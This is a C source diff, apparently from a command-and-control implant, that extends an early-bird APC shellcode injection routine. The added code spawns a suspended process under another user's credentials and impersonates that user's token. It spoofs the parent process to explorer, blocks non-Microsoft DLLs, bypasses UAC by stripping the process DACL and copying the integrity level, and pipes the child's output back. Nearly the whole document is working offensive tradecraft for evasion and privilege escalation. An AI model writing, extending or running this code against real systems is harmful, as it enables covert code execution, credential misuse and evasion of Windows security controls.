@@ -9,6 +9,7 @@
 #include <string.h>
 #include <windows.h>
 #include <tlhelp32.h>
+#include <aclapi.h>
 
 #if defined(INCLUDE_CMD_SPAWN) || defined(INCLUDE_CMD_SPAWNTO) || defined(INCLUDE_CMD_LIGOLO_START) || defined(INCLUDE_CMD_SPAWNAS) || defined(INCLUDE_CMD_EXECUTE_ASSEMBLY) || defined(INCLUDE_CMD_BLOCKDLLS)
 
@@ -292,6 +293,7 @@ int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
 
 int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len,
                              const char *username, const char *domain, const char *password,
+                             int logon_type, int bypass_uac, int capture_output,
                              EarlyBirdResult *out, char *errmsg, size_t errmsg_len) {
     /* Resolve host process full path */
     wchar_t whost_name[512] = {0};
@@ -324,15 +326,77 @@ int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len
 
     /* Add user SID to window station + desktop DACLs before spawning */
     char desktop_name[320] = {0};
-    grant_winsta_desktop_access(username,
-                                use_domain ? domain : NULL,
-                                desktop_name, sizeof(desktop_name));
+    if (logon_type != 9)
+        grant_winsta_desktop_access(username,
+                                    use_domain ? domain : NULL,
+                                    desktop_name, sizeof(desktop_name));
+
+    /* ----- Pipe for output capture (same pattern as earlybird_inject) ----- */
+    HANDLE hPipeRead  = NULL;
+    HANDLE hPipeWrite = NULL;
+    HANDLE hNullIn    = NULL;
+    /* For types 3/4/5/8: PPID spoof is possible (CreateProcessW).
+     * Duplicate pipe write-ends into explorer's handle table so the child inherits them. */
+    DWORD  spoof_pid  = 0;
+    HANDLE hParent    = NULL;
+    HANDLE hDupWrite  = NULL;
+    HANDLE hDupNullIn = NULL;
+
+    out->hPipeRead = NULL;
+
+    if (capture_output) {
+        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+        if (CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
+            SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);
+            hNullIn = CreateFileA("nul", GENERIC_READ,
+                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                  &sa, OPEN_EXISTING, 0, NULL);
+        } else {
+            hPipeRead = NULL; hPipeWrite = NULL;
+        }
+
+        /* PPID spoof only for CreateProcessW path (types 3/4/5/8) */
+        if (hPipeWrite && (logon_type == 3 || logon_type == 4 ||
+                           logon_type == 5 || logon_type == 8)) {
+            spoof_pid = find_explorer_pid();
+            if (spoof_pid) {
+#ifdef EVASION_SYSCALLS
+                NTSTATUS _st = kratos_NtOpenProcess(&hParent,
+                                   PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, spoof_pid);
+                if (!NT_SUCCESS(_st)) hParent = NULL;
+#else
+                hParent = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE,
+                                      FALSE, spoof_pid);
+#endif
+            }
+            if (hParent) {
+                if (!DuplicateHandle(GetCurrentProcess(), hPipeWrite,
+                                     hParent, &hDupWrite, 0, TRUE, DUPLICATE_SAME_ACCESS))
+                    hDupWrite = NULL;
+                if (hNullIn && hNullIn != INVALID_HANDLE_VALUE) {
+                    if (!DuplicateHandle(GetCurrentProcess(), hNullIn,
+                                         hParent, &hDupNullIn, 0, TRUE, DUPLICATE_SAME_ACCESS))
+                        hDupNullIn = NULL;
+                }
+            }
+        }
+    }
+
+    HANDLE hStdOut = hDupWrite  ? hDupWrite  : hPipeWrite;
+    HANDLE hStdIn  = hDupNullIn ? hDupNullIn
+                   : ((hNullIn && hNullIn != INVALID_HANDLE_VALUE) ? hNullIn : NULL);
 
     STARTUPINFOW si;
     ZeroMemory(&si, sizeof(si));
     si.cb          = sizeof(si);
     si.dwFlags     = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
+    if (hStdOut) {
+        si.dwFlags    |= STARTF_USESTDHANDLES;
+        si.hStdOutput  = hStdOut;
+        si.hStdError   = hStdOut;
+        si.hStdInput   = hStdIn;
+    }
     if (desktop_name[0]) {
         wchar_t wdesktop[320] = {0};
         MultiByteToWideChar(CP_UTF8, 0, desktop_name, -1, wdesktop, 320);
@@ -342,18 +406,194 @@ int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len
     PROCESS_INFORMATION pi;
     ZeroMemory(&pi, sizeof(pi));
 
-    BOOL ok = CreateProcessWithLogonW(
-        wuser, use_domain ? wdomain : NULL, wpass,
-        LOGON_WITH_PROFILE,
-        whost_full, wcmdline,
-        CREATE_SUSPENDED | CREATE_NO_WINDOW,
-        NULL, NULL,
-        &si, &pi
-    );
-    if (!ok) {
-        snprintf(errmsg, errmsg_len, "Error: CreateProcessWithLogonW(%s\\%s) failed (%lu)",
-                 use_domain ? domain : "*", username, GetLastError());
-        return 0;
+    /* hTokenDup: non-NULL when using SetThreadToken path (types 3/4/5/8) */
+    HANDLE hTokenDup = NULL;
+    BOOL ok = FALSE;
+
+    if (logon_type == 3 || logon_type == 4 || logon_type == 5 || logon_type == 8) {
+        /* Remote impersonation: LogonUser + DuplicateTokenEx + CreateProcessW(SUSPENDED)
+         * + SetThreadToken before ResumeThread. Requires SeImpersonatePrivilege. */
+        DWORD logon32_type;
+        if      (logon_type == 3) logon32_type = LOGON32_LOGON_NETWORK;
+        else if (logon_type == 4) logon32_type = LOGON32_LOGON_BATCH;
+        else if (logon_type == 5) logon32_type = LOGON32_LOGON_SERVICE;
+        else                      logon32_type = LOGON32_LOGON_NETWORK_CLEARTEXT;
+
+        /* UPN format (user@domain): pass NULL domain, let LSA resolve */
+        wchar_t *logon_dom = use_domain ? wdomain
+                           : (strchr(username, '@') ? NULL : L".");
+
+        HANDLE hToken = NULL;
+        if (!LogonUserW(wuser, logon_dom, wpass,
+                        logon32_type, LOGON32_PROVIDER_DEFAULT, &hToken)) {
+            snprintf(errmsg, errmsg_len, "Error: LogonUser failed for %s\\%s (%lu)",
+                     use_domain ? domain : ".", username, GetLastError());
+            return 0;
+        }
+        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
+                              SecurityImpersonation, TokenImpersonation, &hTokenDup)) {
+            snprintf(errmsg, errmsg_len, "Error: DuplicateTokenEx failed (%lu)", GetLastError());
+            CloseHandle(hToken);
+            return 0;
+        }
+        CloseHandle(hToken);
+
+        /* PPID spoof + BlockDLLs attr list (same as earlybird_inject) */
+        int     attr_count = (hParent ? 1 : 0) + (g_blockdlls ? 1 : 0);
+        BOOL    use_attr   = FALSE;
+        LPPROC_THREAD_ATTRIBUTE_LIST attr = NULL;
+        DWORD64 mitigation_policy =
+            PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+
+        if (attr_count > 0) {
+            SIZE_T attr_size = 0;
+            InitializeProcThreadAttributeList(NULL, attr_count, 0, &attr_size);
+            attr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
+            if (attr && InitializeProcThreadAttributeList(attr, attr_count, 0, &attr_size)) {
+                use_attr = TRUE;
+                if (hParent)
+                    UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                                              &hParent, sizeof(hParent), NULL, NULL);
+                if (g_blockdlls)
+                    UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                                              &mitigation_policy, sizeof(mitigation_policy),
+                                              NULL, NULL);
+            } else {
+                if (attr) { HeapFree(GetProcessHeap(), 0, attr); attr = NULL; }
+            }
+        }
+
+        STARTUPINFOEXW siex3;
+        ZeroMemory(&siex3, sizeof(siex3));
+        siex3.StartupInfo        = si;
+        siex3.StartupInfo.cb     = use_attr ? (DWORD)sizeof(siex3) : (DWORD)sizeof(STARTUPINFOW);
+        if (use_attr) siex3.lpAttributeList = attr;
+
+        DWORD cflags3 = CREATE_SUSPENDED | CREATE_NO_WINDOW;
+        if (use_attr) cflags3 |= EXTENDED_STARTUPINFO_PRESENT;
+
+        ok = CreateProcessW(whost_full, wcmdline, NULL, NULL,
+                            (hStdOut != NULL) ? TRUE : FALSE,
+                            cflags3, NULL, NULL, &siex3.StartupInfo, &pi);
+        if (use_attr) { DeleteProcThreadAttributeList(attr); HeapFree(GetProcessHeap(), 0, attr); }
+
+        /* Close local copies; child inherits from parent's table */
+        if (hPipeWrite) CloseHandle(hPipeWrite);
+        if (hNullIn && hNullIn != INVALID_HANDLE_VALUE) CloseHandle(hNullIn);
+        if (hDupWrite  && hParent)
+            DuplicateHandle(hParent, hDupWrite,  NULL, NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+        if (hDupNullIn && hParent)
+            DuplicateHandle(hParent, hDupNullIn, NULL, NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+        if (hParent) CloseHandle(hParent);
+
+        if (!ok) {
+            snprintf(errmsg, errmsg_len, "Error: CreateProcessW(%s) failed (%lu)",
+                     g_spawnto_path, GetLastError());
+            CloseHandle(hTokenDup);
+            if (hPipeRead) CloseHandle(hPipeRead);
+            return 0;
+        }
+    } else if (bypass_uac) {
+        /* UAC bypass for types 2/9: LogonUser(non-filtered) + copy IL + strip DACL
+         * + ImpersonateLoggedOnUser + CreateProcessWithLogonW(NETCREDENTIALS_ONLY).
+         * Same technique as runas -b (RunasCS --bypass-uac). */
+        wchar_t *logon_dom_b = use_domain ? wdomain
+                             : (strchr(username, '@') ? NULL : L"");
+
+        /* Seed LSA: Interactive logon + impersonate + revert (RunasCS IsUserProfileCreated pattern) */
+        HANDLE hTokenSeed = NULL;
+        if (LogonUserW(wuser, logon_dom_b, wpass,
+                       LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hTokenSeed)) {
+            HANDLE hTokenSeedDup = NULL;
+            if (DuplicateTokenEx(hTokenSeed, TOKEN_ALL_ACCESS, NULL,
+                                 SecurityImpersonation, TokenImpersonation, &hTokenSeedDup)) {
+                ImpersonateLoggedOnUser(hTokenSeedDup);
+                RevertToSelf();
+                CloseHandle(hTokenSeedDup);
+            }
+            CloseHandle(hTokenSeed);
+        }
+
+        HANDLE hTokenB = NULL;
+        int uac_fallbacks[] = { LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_LOGON_NETWORK,
+                                LOGON32_LOGON_BATCH, LOGON32_LOGON_SERVICE, -1 };
+        DWORD uac_err = 0;
+        for (int fi = 0; uac_fallbacks[fi] != -1 && !hTokenB; fi++) {
+            if (LogonUserW(wuser, logon_dom_b, wpass,
+                           (DWORD)uac_fallbacks[fi], LOGON32_PROVIDER_DEFAULT, &hTokenB))
+                break;
+            uac_err = GetLastError();
+            hTokenB = NULL;
+        }
+        if (!hTokenB) {
+            if (hPipeWrite) CloseHandle(hPipeWrite);
+            if (hNullIn && hNullIn != INVALID_HANDLE_VALUE) CloseHandle(hNullIn);
+            if (hPipeRead) CloseHandle(hPipeRead);
+            snprintf(errmsg, errmsg_len, "Error: LogonUser failed for bypass-uac (%lu)", uac_err);
+            return 0;
+        }
+
+        /* Copy IL of current process token to bypass token */
+        HANDLE hCurTok = NULL;
+        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hCurTok)) {
+            DWORD il_size = 0;
+            GetTokenInformation(hCurTok, TokenIntegrityLevel, NULL, 0, &il_size);
+            TOKEN_MANDATORY_LABEL *pTIL = (TOKEN_MANDATORY_LABEL *)malloc(il_size);
+            if (pTIL) {
+                if (GetTokenInformation(hCurTok, TokenIntegrityLevel, pTIL, il_size, &il_size))
+                    SetTokenInformation(hTokenB, TokenIntegrityLevel, pTIL, il_size);
+                free(pTIL);
+            }
+            CloseHandle(hCurTok);
+        }
+
+        /* Strip DACL from current process (required by seclogon) */
+        SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT,
+                        DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL);
+
+        ImpersonateLoggedOnUser(hTokenB);
+        wchar_t *spawn_dom_b = use_domain ? wdomain : L".";
+        ok = CreateProcessWithLogonW(
+            wuser, spawn_dom_b, wpass,
+            LOGON_NETCREDENTIALS_ONLY,
+            whost_full, wcmdline,
+            CREATE_SUSPENDED | CREATE_NO_WINDOW,
+            NULL, NULL,
+            &si, &pi
+        );
+        DWORD uac_spawn_err = GetLastError();
+        RevertToSelf();
+        CloseHandle(hTokenB);
+
+        if (hPipeWrite) CloseHandle(hPipeWrite);
+        if (hNullIn && hNullIn != INVALID_HANDLE_VALUE) CloseHandle(hNullIn);
+        if (!ok) {
+            snprintf(errmsg, errmsg_len, "Error: CreateProcessWithLogonW bypass-uac (%s\\%s) failed (%lu)",
+                     use_domain ? domain : "*", username, uac_spawn_err);
+            if (hPipeRead) CloseHandle(hPipeRead);
+            return 0;
+        }
+    } else {
+        /* Types 2/9: CreateProcessWithLogonW - no PPID spoof (API limitation).
+         * Pipe write-ends set directly in STARTUPINFO (bInheritHandles=TRUE). */
+        DWORD logon_flags = (logon_type == 9) ? LOGON_NETCREDENTIALS_ONLY : LOGON_WITH_PROFILE;
+        ok = CreateProcessWithLogonW(
+            wuser, use_domain ? wdomain : NULL, wpass,
+            logon_flags,
+            whost_full, wcmdline,
+            CREATE_SUSPENDED | CREATE_NO_WINDOW,
+            NULL, NULL,
+            &si, &pi
+        );
+        /* Close local write-ends after CreateProcessWithLogonW */
+        if (hPipeWrite) CloseHandle(hPipeWrite);
+        if (hNullIn && hNullIn != INVALID_HANDLE_VALUE) CloseHandle(hNullIn);
+        if (!ok) {
+            snprintf(errmsg, errmsg_len, "Error: CreateProcessWithLogonW(%s\\%s) failed (%lu)",
+                     use_domain ? domain : "*", username, GetLastError());
+            if (hPipeRead) CloseHandle(hPipeRead);
+            return 0;
+        }
     }
 
     /* Alloc RW in remote process */
@@ -415,6 +655,7 @@ int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len
     if (!NT_SUCCESS(st)) {
         VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
         TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+        if (hTokenDup) CloseHandle(hTokenDup);
         snprintf(errmsg, errmsg_len, "Error: NtQueueApcThread failed (0x%08lX)", (unsigned long)st);
         return 0;
     }
@@ -422,16 +663,30 @@ int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len
     if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)rmem, pi.hThread, 0)) {
         VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
         TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+        if (hTokenDup) CloseHandle(hTokenDup);
         snprintf(errmsg, errmsg_len, "Error: QueueUserAPC failed (%lu)", GetLastError());
         return 0;
     }
 #endif
 
+    /* Set impersonation token before resume for types 3/4/5/8 */
+    if (hTokenDup) {
+        if (!SetThreadToken(&pi.hThread, hTokenDup)) {
+            VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
+            TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+            CloseHandle(hTokenDup);
+            snprintf(errmsg, errmsg_len, "Error: SetThreadToken failed (%lu)", GetLastError());
+            return 0;
+        }
+        CloseHandle(hTokenDup);
+    }
+
     ResumeThread(pi.hThread);
 
-    out->hProcess = pi.hProcess;
-    out->hThread  = pi.hThread;
-    out->pid      = pi.dwProcessId;
+    out->hProcess  = pi.hProcess;
+    out->hThread   = pi.hThread;
+    out->pid       = pi.dwProcessId;
+    out->hPipeRead = hPipeRead;
     return 1;
 }
 
